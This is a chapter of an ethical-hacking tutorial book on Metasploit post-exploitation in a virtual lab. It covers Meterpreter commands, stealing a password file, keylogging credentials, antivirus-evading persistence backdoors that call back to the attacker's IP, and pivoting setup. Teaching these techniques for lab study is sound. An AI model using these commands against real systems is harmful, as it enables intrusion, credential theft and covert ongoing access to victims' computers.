<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">Post Exploitation</h1>
                </header>
            
            <article>
                
<p class="mce-root">In previous chapters, we covered how to access devices through the use of various techniques. We will now move on to the post exploitation task, which will focus on the Meterpreter session and how we can exploit a target system once we have gained access to it. Then, we will look at the basic filesystem commands that can help us to exploit a target system.</p>
<p class="mce-root">Hitherto in this book, we have accessed a targeted system only to the point that a victim has our backdoor file or software running on their system. Now, we will look at how to maintain our access to the system, through both simple and advanced methods. We will even cover what can be done after performing a keylogging attack. Then, we will look at the important concept of pivoting, and we will use it to create an autoroute.</p>
<p>This chapter will cover the following topics:</p>
<ul>
<li class="mce-root">An introduction to post exploitation </li>
<li>Meterpreter basics</li>
<li>Filesystem commands</li>
<li>Maintaining access by using simple methods</li>
<li>Maintaining access by using advanced methods</li>
<li>Keylogging</li>
<li>An introduction to pivoting</li>
<li>Pivoting autoroutes</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">An introduction to post exploitation</h1>
                </header>
            
            <article>
                
<p>Now that we've learned how to gain access to our target, let's look at what we can do with that target. In this section, we will learn a number of things that can be done after we have gained access to a computer. We will look at what to do with a computer regardless of how we gain access to it—whether we use a server-side exploit, social engineering, a backdoor, a problem with a certain application, or some other method.</p>
<p>In the previous chapters, we always stopped when we got to a reverse Meterpreter session from our target. In this chapter, we are going to start with a Meterpreter session. We're not going to discuss how we gained access, but what we can do <em>after</em> gaining access. We will be discussing some really cool things, such as how to maintain access to a target computer even if its user uninstalls the vulnerable program or restarts the computer. We will look at how to download, upload, and read files, open the webcam, start the keylogger to register keystrokes, and so on. We will also look at how to use a target computer as a pivot to exploit all computers on the same network (supposing that, for example, our target isn't actually the computer that we hacked, but is on the same network as that computer). Again, all of the things that we will do in this chapter will focus on after we have exploited a target's vulnerabilities and have gained access to it.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Meterpreter basics</h1>
                </header>
            
            <article>
                
<p>In this section, we'll learn some basics on how to interact with Metasploit's Meterpreter. In Linux, the <kbd>help</kbd> command is always the best command to run in terms of getting information about a specific command. So, the first thing that we will do is run the <kbd>help</kbd> command, to get a big list of all of the commands that we can run, and a description of what each command does, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1727 image-border" src="assets/34bf1d5a-97db-40e5-a381-7d386199ea05.png" style="width:47.67em;height:42.75em;"/></div>
<p>Looking at some of the basics, the first thing that we will highlight is the <kbd>background</kbd> command, as follows:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/0aac5654-2ebf-45ec-9914-0f9a530b377f.png" style="width:18.08em;height:2.58em;"/></div>
<p>The <kbd>background</kbd> command basically backgrounds the current session without terminating it. It's very similar to minimizing a window. So, after running the <kbd>background</kbd> command, we can go back to Metasploit and run other commands to further exploit the target machine (or other machines), maintaining our connection to the computer that we just hacked. To see a list of all of the computers and sessions that we have in use, we can run the <kbd>sessions -l</kbd> command, which shows the current sessions. As we can see in the following screenshot, we still have the Meterpreter session—we didn't lose it, and it's between our device and the target device, which is <kbd>10.0.2.5</kbd>:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1729 image-border" src="assets/9d71df47-55c4-486a-b6ab-f09ce2723ff4.png" style="width:86.17em;height:12.42em;"/></div>
<p>If we want to go back to the previous session to run Meterpreter again, all we have to do is run the <kbd>sessions</kbd> command with <kbd>-i</kbd> (for interact), and then put the ID (in our case, <kbd>2</kbd>), as follows:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1730 image-border" src="assets/3ff55357-ec95-4d9f-80c7-c79b6d1add3e.png" style="width:23.17em;height:4.92em;"/></div>
<p>Another command is <kbd>sysinfo</kbd>. We run this command every time we hack into a system; it shows us information about the target computer. As we can see in the following screenshot, it shows us the computer's name, its operating system, and its architecture. Also in the following screenshot, we can see that it's a 64-bit computer, so if we want to run executables on the target in the future, we know to create 64-bit executables:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1731 image-border" src="assets/e19418a4-df0d-4e7d-b60d-d159df206719.png" style="width:23.42em;height:9.00em;"/></div>
<p>We can see that the language in use is English, the workgroup that the computer is working on, and the user ID that is logged in. We can also see the version of Meterpreter that's running on the target machine, and it's actually a 32-bit version.</p>
<p>Another useful command for gathering information is <kbd>ipconfig</kbd>. The <kbd>ipconfig</kbd> command in this case is very similar to the <kbd>ipconfig</kbd> command that we run on Windows machines (in the Command Prompt); it will show us all of the interfaces that are connected to the target computer, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1732 image-border" src="assets/d2dc6a45-6290-405a-8ea1-a9374630ac4d.png" style="width:32.67em;height:26.33em;"/></div>
<p>For example, we can see <kbd>Interface 1</kbd>, the MAC address, the IP address, and even the IPv4 address, connected to multiple networks. We can also see all of the interfaces and how to interact with them.</p>
<p>Another useful information gathering command is the <kbd>ps</kbd> command. The <kbd>ps</kbd> command will list all of the processes that are running on the target computer; these might be background processes, or actual programs running in the foreground as Windows programs or GUIs. In the following screenshot, we can see a list of all of the processes that are running, along with each one's name and <kbd>ID</kbd> or <kbd>PID</kbd>:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1733 image-border" src="assets/2cfc41e0-14ee-4690-845e-042428bd5aed.png" style="width:44.42em;height:22.58em;"/></div>
<p>One interesting process is <kbd>explorer.exe</kbd>—that's literally the graphical interface of Windows, and we can see in the preceding screenshot that it's running on <kbd>PID 4744</kbd>, as shown here:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1734 image-border" src="assets/0f82e3e8-c249-415a-aeec-f2207f4db7a4.png" style="width:45.58em;height:4.50em;"/></p>
<p>Once we have hacked into a system, it is a very good idea to migrate the process that the computer is running on into a process that is safer. For example, the <kbd>explorer.exe</kbd> process is the graphical interface of Windows, so it's always running, as long as the person is using their device. This means that it's much safer than the process through which we gained access to the computer. For example, if we gained access through an executable or a program, we will lose the process as soon as the person closes that program. A better method is to migrate to a process that is less likely to be closed or terminated. To do so, we will use a command called <kbd>migrate</kbd>, which will move our current session into a different process. We will use the <kbd>explorer.exe</kbd> process, because it's very safe.</p>
<p>Use the <kbd>migrate 4744</kbd> command, where <kbd>4744</kbd> is the <kbd>PID</kbd> of the <kbd>explorer.exe</kbd> process. The following is the output of the <kbd>migrate</kbd> command:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1735 image-border" src="assets/dc7947f5-8e8f-43ce-bee2-d9f85ab379bb.png" style="width:19.25em;height:3.00em;"/></div>
<p class="mce-root CDPAlignLeft CDPAlign">At the moment, Meterpreter is running from the <kbd>explorer.exe</kbd> <span>process</span>. If we go to the <span class="packt_screen">Task Manager</span> on the target computer and run our <span class="packt_screen">Resource Monitor</span>, and then go to the <span class="packt_screen">Network</span> tab and into <span class="packt_screen">TCP Connections</span>, we will see that the connection on port <kbd>8080</kbd> is coming from the <kbd>explorer.exe</kbd> process, as shown here:</p>
<div class="CDPAlignCenter CDPAlign packt_figref"><img src="assets/346ac043-6734-4fd8-a8d5-58ff0f018994.png"/><br/>
TCP Connections </div>
<p>So, as for the target, it's not coming from a malicious file, our payload, or a backdoor, it's running through <kbd>explorer.exe</kbd>, which is not suspicious. Now, if we see Firefox or Chrome, we can migrate to those processes. And, if we are connecting through port <kbd>8080</kbd> or <kbd>80</kbd>, it's going to look even less suspicious, because ports <kbd>80</kbd> and <kbd>8080</kbd> are used by web servers, so it's very natural to have a connection through them.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Filesystem commands</h1>
                </header>
            
            <article>
                
<p>Now, we're going to look at some more commands that will allow us to navigate, list, read, download, upload, and even execute files on the target computer. We have a Meterpreter session running, and the first thing that we will do is get our current working directory by using the <kbd>pwd</kbd> command. It will bring us to the <kbd>C:\Users</kbd> location. If we want to list all of the files and directories, we can use the <kbd>ls</kbd> command; the following screenshot shows the list of files:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1736 image-border" src="assets/8d812699-ad81-44d7-ac81-9248bca4b556.png" style="width:39.83em;height:14.92em;"/></div>
<p>Let's suppose that we want to navigate to the <kbd><span>IEUser</span></kbd> folder. We will use the <kbd>cd IEUser</kbd> command, and if we use <kbd>pwd</kbd>, we will be in the <kbd>C:\Users\IEUser</kbd> directory. Then, we will go into the <kbd>Downloads</kbd> directory and list the files. In the following list of files, we can see <kbd>passwords.txt</kbd>, which seems like an interesting file:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1737 image-border" src="assets/258df5ee-6842-45db-b4c8-c9fb720a881b.png" style="width:39.08em;height:18.50em;"/></div>
<p>If we want to read this file, all we have to do is use the <kbd>cat paswords.txt</kbd> command. We can then see the content of the file, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1738 image-border" src="assets/3470d197-f353-4efe-89ad-74a60298dceb.png" style="width:17.33em;height:2.17em;"/></div>
<p>If we check this file, we will see that the output we received from the <kbd>cat</kbd> command matches the content of the file.</p>
<p>Let's suppose that we want to keep this file for later. We can download it by using the <kbd>download</kbd> command and the filename, which is <kbd>paswords.txt</kbd>. The command's output is shown as follows:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1739 image-border" src="assets/e50a4766-2c97-406a-a526-d33f591d4cd7.png" style="width:36.92em;height:4.00em;"/></div>
<p>Once we launch the command, the file will be downloaded; if we go to our <kbd>root</kbd> directory, we will see a file called <kbd>paswords.txt</kbd>, containing all of its data:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1740 image-border" src="assets/941490e5-bba2-4bd4-86bf-d17b82d599a2.png" style="width:30.92em;height:16.00em;"/></p>
<p>Now, suppose that we have a backdoor, a virus, a Trojan, or a keylogger that we want to upload to the target computer. We can upload it very easily. Going back to our <kbd>root</kbd> directory, we can see a lot of files, including one called <kbd>backdoored-calc.exe</kbd>. We're going to try to upload that file by running the <kbd>upload</kbd> command, along with the filename. The file will be uploaded, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1741 image-border" src="assets/f90903cd-3a5b-46d9-94d1-4b02c19cea7d.png" style="width:64.75em;height:6.08em;"/></div>
<p>We will now bring up a list to make sure that the file exists; in the following screenshot, we can see a new file called <kbd>backdoored-calc.exe</kbd> in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1742 image-border" src="assets/ea143324-ac38-4c0e-812a-4c4101152fa6.png" style="width:40.67em;height:14.25em;"/></div>
<p>To execute the uploaded file on the target computer (if it is a virus or a keylogger), all we have to do is run the <kbd>execute</kbd> command and specify the file that we would like to execute after the <kbd>-f</kbd> option. For our example, the file is <kbd>backdoored-calc.exe</kbd>. Once we execute it, we will see that the process <kbd>3324</kbd> has been created, so our backdoor has been executed:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1743 image-border" src="assets/3f12e3f5-ea77-4caa-ac71-93a66a9becd4.png" style="width:25.08em;height:2.50em;"/></div>
<p>Now, if <kbd><span>backdoored-calc.exe</span></kbd> is a virus, it will do what it's supposed to do.</p>
<p>Another feature is the <kbd>shell</kbd> command, which converts the current Metasploit or Meterpreter session into an operating system shell. If we type in the <kbd>shell</kbd> command, we will get a Windows command line, where we can execute Windows commands. As we can see in the following screenshot, it's on a different channel, and we can run any Windows command that we want through it. So, we can run the <kbd>dir</kbd> command to list all directories; we can use <kbd>ipconfig</kbd>; and we can use any other Windows command, exactly like running the commands through the Command Prompt:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1744 image-border" src="assets/dfcc1f19-d59a-4754-a0b5-0ecf9ad29af7.png" style="width:27.08em;height:5.67em;"/></div>
<p>There are many more commands that we can use for filesystem management. If we type in the <kbd>help</kbd> command and go to the filesystem section, we will see that we can edit, download, move a file to another file, rename files, delete files, remove directories, search, and so on. There are so many more things we can do with the filesystem, and we have just given a basic overview of the main commands that we can use to manage the filesystem on the target computer, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1745 image-border" src="assets/84e4820c-faab-4f65-a120-bf61023cf5d2.png" style="width:32.25em;height:28.17em;"/></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Maintaining access by using simple methods</h1>
                </header>
            
            <article>
                
<p>In all of the examples that we've seen so far, we would lose our connection to the target computer as soon as the target user restarted the computer, because we used a normal backdoor, and once the computer restarted, that backdoor would be terminated, the process would be terminated, and we would lose our connection. In this section, we will discuss the methods that will allow us to maintain our access to the target computer, so that we can come back at any time and regain full control over the computer. There are a number of ways of doing this. The first one is by using Veil-Evasion; we can use an HTTP service or a TCP service instead of the HTTP backdoor that we created.</p>
<p>Let's look at an example. If we use Veil-Evasion and run the <kbd>list</kbd> command, we will see that at the numbers <kbd>6</kbd> and <kbd>8</kbd>, we have service backdoors, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1746 image-border" src="assets/cdea154a-69a5-4c0c-af93-a610de5d4d4f.png" style="width:42.08em;height:21.33em;"/></div>
<p>If we run <kbd>use 6</kbd>, all we have to do is set up the <kbd>LHOST</kbd> and then <kbd>generate</kbd> the backdoor; we can combine it with other methods and send it to the target person, or we can upload it by using the <kbd>upload</kbd> command that we learned and then execute it, and that will install the backdoor as a service on the target computer:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1747 image-border" src="assets/b18ebb20-5e4e-4c8c-aba2-f15f9bbc843d.png" style="width:42.83em;height:38.25em;"/></div>
<p>All we have to do is use the multi-handler, and any time our target computer starts, it will try to connect back to us, because it is a reverse shell. We won't look at this method in detail, because it's very simple. We've done something similar to it before: we created a backdoor using Veil-Evasion and uploaded it to a target computer. So, all we have to do is create a backdoor, upload it, execute it, and then we are done. This doesn't always work—that's another reason we are not going to study it in detail. The normal backdoors are much more reliable; that's why we used a normal backdoor when we were combining backdoors with other methods such as changing its icon.</p>
<p>Another method is to use a module that comes with Meterpreter, called <kbd>persistence</kbd>; let's look at how we can use it. All we have to do is use <kbd>run</kbd> with <kbd>persistence</kbd>, and then use <kbd>-h</kbd> to see the help menu, to show us all of the options that we can set up. In the following screenshot, we can see that <kbd>-A</kbd> starts a multi-handler straightaway; we don't really need to change the location where the backdoor will be installed:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1748 image-border" src="assets/6fd5cbff-6faf-4ac9-8185-489958f4d7d4.png" style="width:68.00em;height:28.83em;"/></div>
<p>The <kbd>-P</kbd> option will specify the payload; again, <kbd>windows/meterpreter/reverse_tcp</kbd> is a really good payload, so we don't really need to mess with it. The <kbd>-S</kbd> option is used to start using system privileges; as mentioned previously, we don't have system privileges, so we should be using the <kbd>-U</kbd> option. Then, we can use the <kbd>-i</kbd> option to set up the amount of time during which the backdoor will try to connect back to us; it'll try to connect every 10, 15, or 20 seconds—whatever we specify. The <kbd>-p</kbd> option is to specify the port, and the <kbd>-r</kbd> option is to specify the IP of our computer.</p>
<p>To run <kbd>persistence</kbd>, all we have to do is use <kbd>run persistence</kbd>, <kbd>-U</kbd> (to start it under user privileges), <kbd>-i</kbd> at <kbd>20</kbd> seconds, and then <kbd>-p</kbd>, and we will probably put <kbd>80</kbd>, because, as we mentioned, port <kbd>80</kbd> doesn't look suspicious. Then, we can use <kbd>-r</kbd> to specify our IP, which is <kbd>10.0.2.15</kbd>. The command will look something like the following:</p>
<pre><strong><span>run persistence -U -i 20 -p 80 -r 10.0.2.15</span></strong></pre>
<p>Obviously, once we run this, if we want to receive a connection, we have to start the multi-handler on port <kbd>80</kbd> (or on the selected port using the payload). The problem with this method is that it's detectable by antivirus programs; therefore, we won't explain it in more detail. We will instead explain a combination of both of these methods, which will not be detectable by antivirus programs and will be much more robust than using Veil-Evasion.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Maintaining access by using advanced methods</h1>
                </header>
            
            <article>
                
<p>In this section, we will use the normal HTTP reverse Meterpreter undetectable backdoor that we created previously. We will inject it as a service, so that it will run every time the target user runs their computer; it will try to connect back to us at certain intervals. To do this, first, we will <kbd>background</kbd> the current session. We've done that before; we can use <kbd>background</kbd> and still interact with the session on number <kbd>2</kbd>.</p>
<p>We will <kbd>use</kbd> a module; it is like the multi-handler module that comes with Metasploit, and it's called <kbd>exploit/windows/local/persistence</kbd>. We will look at its options, to see what we need to configure. In the following screenshot, we can see similar options to what we've seen in the Metasploit service:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1749 image-border" src="assets/017ea596-8c76-439a-b1e8-dfcb39250b8c.png" style="width:96.92em;height:31.50em;"/></p>
<p>The first thing is the number of seconds during which the target will try to connect back to us—the <kbd>DELAY</kbd>. We are going to keep that at <kbd>10</kbd> seconds—so, every <kbd>10</kbd> seconds, the target computer will try to connect back to us. Now, <kbd>EXE_NAME</kbd> is the name that will show up under the processes where the connection is responding back from. We will set that to the browser, to make it less detectable; so, we will set <kbd>EXE_NAME</kbd> to <kbd>browser.exe</kbd>. The command is as follows:</p>
<pre><strong>set EXE_NAME browser.exe</strong></pre>
<p>The <kbd>PATH</kbd> where the payload or backdoor will be installed will be left the same, and the <kbd>REG_NAME</kbd> (the registry entry) will also stay the same. Now, this is very important: we need to specify which session to run the exploit on. For this example, we are using session number <kbd>2</kbd>; that's our Meterpreter session. If we use <kbd>sessions -l</kbd>, it will list all of the available sessions, and we will see that its <kbd>Id</kbd> number is <kbd>1</kbd>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1750 image-border" src="assets/c4265831-12d8-430d-8ff8-22db5035ac0b.png" style="width:86.00em;height:12.42em;"/></p>
<p>We need to set our <kbd>SESSION</kbd> to number <kbd>2</kbd>. So, we will use <kbd>set SESSION 2</kbd>, and the <kbd>STARTUP</kbd> will be left as <kbd>USER</kbd>, for the user privileges. Now, if we run <kbd>show options</kbd>, we can see that <kbd>browser.exe</kbd> and the session number <kbd>2</kbd> are set, as follows:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1751 image-border" src="assets/fb4d45d1-fb02-49b5-8e18-36d5b4409559.png" style="width:97.08em;height:30.00em;"/></p>
<p>The most important thing to do is specify the payload that will be injected as a service. To do that, we will run <kbd>show advanced</kbd>. The <kbd>show advanced</kbd> command will show us the advanced options that we can set up for this particular module. The one that we're interested in is called <kbd>EXE::Custom</kbd>, indicating that we're going to use a custom <kbd>.exe</kbd> to run and inject into the target computer as a service:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1752 image-border" src="assets/ddf26d29-9df1-44f2-8812-56463cfd25de.png" style="width:89.25em;height:39.00em;"/></p>
<p>We will set <kbd>EXE::Custom</kbd> to <kbd>/var/www/html/backdoor.exe</kbd>, so that we can run our backdoor that we had that stored in <kbd>/var/www/html/backdoor.exe</kbd>. The command is as follows:</p>
<pre><strong>set EXE::Custom /var/www/html/backdoor.exe</strong></pre>
<p>Now, we will run <kbd>show advanced</kbd> to make sure that it was set up properly, because sometimes we misspell things:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1753 image-border" src="assets/bdc071fb-f985-41c9-9049-bcf6ea0482f7.png" style="width:97.75em;height:39.00em;"/></p>
<p>We are going to <kbd>exploit</kbd> this, and that will upload <kbd>/var/www/html/backdoor.exe</kbd> onto the target computer, using the session that we specified (session number <kbd>2</kbd>). We will see that it's been uploaded and installed once we execute <kbd>exploit</kbd>, as follows:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1812 image-border" src="assets/4e949480-1a3c-40db-b754-0da3aa486635.png" style="width:85.00em;height:11.08em;"/></p>
<p>An important thing to keep in mind is the resource file, because we can use it to clean up and delete the backdoor once we are done using it. If we don't want the backdoor on the target computer any more, we can use the resource file to delete it. We can store the RC file path from the <kbd>exploit</kbd> command output in the Leafpad, so that we can run it and delete our backdoor in the future.</p>
<p>If we run <kbd>sessions -l</kbd>, it will show that the session is there, and we can interact with it. We can kill that session using the <kbd>session -K</kbd> command<span class="packt_screen">.</span></p>
<p>Now, if we use <kbd>list</kbd>, we will have no connections with the target computer. Using our exploit multi-handler, we can listen for incoming connections.</p>
<p>If we run <kbd>exploit</kbd> and the hacked computer is already booted, we will get a connection straightaway, because our backdoor has been injected into the target computer on port <kbd>8080</kbd> on <kbd>reverse_http</kbd>. However, we are going to restart the target computer, just to make sure that we will always have a connection to it.</p>
<p>Perform a normal restart on the Windows machine. Our Kali computer will try to connect back to it every 10 seconds, no matter how many times the Windows machine is restarted or shut down. We will now r<span>un our Meterpreter handler and wait for connections. Just run</span> <kbd>exploit</kbd> <span>to listen, and it will take a maximum of 10 seconds to get a connection back. As we can see in the following screenshot, we received a connection to the target computer, and we now have full access to that computer:</span></p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1813 image-border" src="assets/1edd814d-5d54-4f3a-8766-430c4a7b9273.png" style="width:86.25em;height:8.50em;"/></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Keylogging</h1>
                </header>
            
            <article>
                
<p>In this section, we'll look at how we can log any mouse or keyboard event that happens on the target computer. We will do that using a plugin that comes with Meterpreter. We have our Meterpreter, so we just have to run <kbd>keyscan_start</kbd>, as follows:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1754 image-border" src="assets/1d7be45f-31fb-4b42-879b-0aca6b3c47ba.png" style="width:21.17em;height:2.42em;"/></p>
<p>Suppose that we want to go to Facebook and log in to an account. If we look at the URL for the site, it includes HTTPS, and there is nothing wrong with it. Generally, we need a password to log in to an account. If we come back to our Terminal, we can see a log of everything that has been recorded by typing <kbd>keyscan_dump</kbd>. With that command, we can see that the target user typed in <kbd>www.facebook.com</kbd>, hit <em>Enter</em>, and put in their username, which was <kbd>zaid@isecur1ty.org</kbd>, and the password <kbd>123456</kbd>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1756 image-border" src="assets/9bd52d90-558f-438d-aba3-13bd8eb8e9d1.png" style="width:22.25em;height:4.58em;"/></p>
<p><span>This will record everything that happens on the computer. We can stop running <kbd>keyscan_stop</kbd>, and it will stop the sniffer.</span></p>
<p><span>Another cool thing that we can do is get a screenshot, just by typing <kbd>screenshot</kbd>; it will save it for us in the <kbd>/root</kbd> directory:</span></p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1757 image-border" src="assets/c59fc08d-0f02-4e5e-aa54-fb53599fbeff.png" style="width:25.58em;height:2.75em;"/></p>
<p><span>Go to <kbd>/root</kbd>, and we'll see that the screenshot is present. It's showing us what's being displayed on the target computer screen:</span></p>
<div class="CDPAlignCenter CDPAlign packt_figref"><img class="aligncenter size-full wp-image-1758 image-border" src="assets/9cff4ff6-b768-4fcd-84fa-ecd255024a59.png" style="width:49.83em;height:32.42em;"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref"><span>Capturing the targets screen</span></div>
<p>These are just two of the useful features we have available. The keylogging is very useful, because we can get usernames and passwords and see what the target user is doing on the computer. Obviously, we can use other keylogger programs, like a portable keylogger; all we have to do is upload them by using the <kbd>upload</kbd> command that we learned previously, and then <kbd>execute</kbd> them.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">An introduction to pivoting</h1>
                </header>
            
            <article>
                
<p>In this section (and a few subsequent sections), we will study the concept of pivoting. We will assume that our target is the <strong>METASPLOITABLE</strong> device. In the following diagram, each one of the big circles is a network, and, as we can see, the Metasploitable device is not visible by the hacker:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/7378244c-3cb7-41ea-bcf1-31aa820e41ff.png" style="width:41.58em;height:21.00em;"/></p>
<p>The <span>Metasploitable</span><strong> </strong>device is hidden, either behind the network, or for some other reason. The hacker is not able to ping or access the IP address of the <span>Metasploitable device. We're assuming that in our example, the Metasploitable device exists in a different network. We can see that the network has four devices. It has the Metasploitable device, an iPhone, another device, and a Windows device (which we hacked, and which is in red); the hacker device exists in the smaller network, and there are only two devices (the hacker, and the Windows machine that we hacked). The goal of pivoting is to use the device that we hacked (the common device in the middle) to compromise other devices that it has access to. So, the hacker cannot see our target, which is the Metasploitable device—but the device that we just hacked can see that device, because they're on the same network.</span></p>
<p>In the next few sections, we will try to hack the <span>Metasploitable device, even while it is not visible to the hacker (the Kali device). The only way to access the Metasploitable device is through the Windows device, which will be used as a pivot.</span></p>
<p>To set up our network (our lab), we will go to the <span class="packt_screen">VirtualBo</span><span class="packt_screen">x</span> settings, and then to <span class="packt_screen">Preferences</span> | <span class="packt_screen">Network;</span> we can see that we have a network that we've been using as the internal NAT network:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1760 image-border" src="assets/cd6f3b66-0342-462d-8d53-e655cf22dfb2.png" style="width:42.83em;height:28.17em;"/></p>
<p>The <span class="packt_screen">NatNetwork</span> is the one that our Windows and Kali devices are connected to. We are going to create another NAT network by clicking on the plus sign (<span class="packt_screen">+</span>), and it will be called <span class="packt_screen">NatNetwork1</span>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1761 image-border" src="assets/875d8084-7548-4b11-9ad2-3c676c54f208.png" style="width:38.92em;height:25.92em;"/></p>
<p>Now, we will click on the third icon to the right to edit the settings, and we can set the network's IP. We will set it to <kbd>10.0.3.0/24</kbd>. The following screenshot shows all of the settings:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1762 image-border" src="assets/313099dc-b052-4258-b23d-1bdea498cbe5.png" style="width:25.92em;height:20.58em;"/></p>
<p>So, we created another network, and the Kali machine is not connected to this network. Now, we will modify the settings of the Windows device to connect it to the two networks. The Windows device, as we can see in the preceding screenshot, is the common device, and it will be connected to the NAT network that the Kali is connected to, and also the one that the Metasploitable device is connected to. In the Windows machine settings, go to <span class="packt_screen">Network |</span> <span class="packt_screen">Adapter 2 |</span> <span class="packt_screen">Enable</span><span class="packt_screen"> Network Adapter,</span> and connect it to a <span class="packt_screen">NAT Network</span>. Then, select <span class="packt_screen">NatNetwork1</span>, as follows:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1763 image-border" src="assets/5f3dffcf-de86-4875-81c9-f70b356945c5.png" style="width:54.08em;height:36.25em;"/></p>
<p>The Windows device now uses two adapters; one of them is connected to <span class="packt_screen">NatNetwork,</span> and the other one is connected to <span><span class="packt_screen">NatNetwork1</span></span>.</p>
<p>On the Metasploitable device, go to <span class="packt_screen">Settings</span> | <span class="packt_screen">Network</span>, and, instead of connecting it to <span class="packt_screen">NatNetwork</span>, connect it to <span class="packt_screen">NatNetwork1</span>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1764 image-border" src="assets/c63883fd-485c-44f0-a1e7-fbd0005b6496.png" style="width:43.83em;height:29.00em;"/></p>
<p>Now, the Metasploitable device is only connected to the network that the Windows device is connected to, and the Kali machine is only connected to the network that the Windows device is connected to; the Windows device is connected to both networks.</p>
<p>Now, to verify that we have the settings, we will start our Metasploitable device and the Windows device, and will use some <kbd>ping</kbd> commands to make sure that everything is set up correctly. The main thing is that the Windows machine should be able to ping both the Metasploitable and Kali devices. In the following screenshot, we can see that we have obtained the IP of the Metasploitable device - <kbd>10.0.3.5</kbd>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1765 image-border" src="assets/c9b1757a-8ff0-4d2a-bce4-2b94f965b158.png" style="width:36.33em;height:18.75em;"/></p>
<p>Run <kbd>ping 10.0.3.5</kbd>, and we will see that the Windows machine can see the Metasploitable machine, as shown in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/81ed271a-5dd2-4fbd-903f-235aa3ef5d9b.png" style="width:33.58em;height:14.67em;"/></p>
<p>Now, let's check whether it can see the Kali machine, which is on <kbd>10.0.2.15</kbd>; again, if Windows can see both machines, it means that it is the machine in the middle:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/c498b1e6-5c1c-433e-a91c-ce7d17b0b785.png" style="width:30.92em;height:13.42em;"/></p>
<p>Also, we will check whether the Metasploitable machine can see the Kali machine. It shouldn't be able to see it, because the Kali machine and the Metasploitable machine are connected to two different networks. When we run <kbd>ping 10.0.2.15</kbd> on the Metasploitable machine, we can see that we get nothing—<kbd>18</kbd> packets are transmitted and <kbd>0</kbd> are received:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1768 image-border" src="assets/ca8726d0-a67e-4d6a-bf77-c93c372c72a1.png" style="width:36.25em;height:4.92em;"/></p>
<p>So, the Metasploitable device cannot see the Kali machine, and the Kali machine cannot see the Metasploitable device, either. Run <kbd>ping 10.0.3.5</kbd> on Kali, and we will see that it sends <kbd>3</kbd> packets and <kbd>0</kbd> are received; these two devices cannot see each other, because they're on two different networks, as the following screenshot indicates:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1769 image-border" src="assets/a4d301e1-4c2d-4daf-8665-0f3613650891.png" style="width:35.08em;height:5.58em;"/></p>
<p>In the next section, we will use our access to the Windows machine to hack into the <span>Metasploitable device, because the Windows machine is the common device, connected to both networks.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
